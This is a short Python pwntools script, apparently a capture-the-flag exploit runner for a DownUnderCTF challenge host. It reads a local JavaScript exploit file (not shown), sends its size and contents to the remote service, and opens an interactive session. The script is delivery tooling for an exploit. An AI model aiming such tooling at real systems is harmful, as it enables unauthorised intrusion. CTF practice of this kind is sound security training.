from pwn import *
import time
p=remote("chal.duc.tf",30004)
context.log_level="DEBUG"

with open("exp.js") as f:
    s=f.read()
print("size: "+str(len(s)))
p.sendlineafter("(in bytes, max 100KB):",str(len(s)))

time.sleep(0.5)
p.send(s)

p.interactive()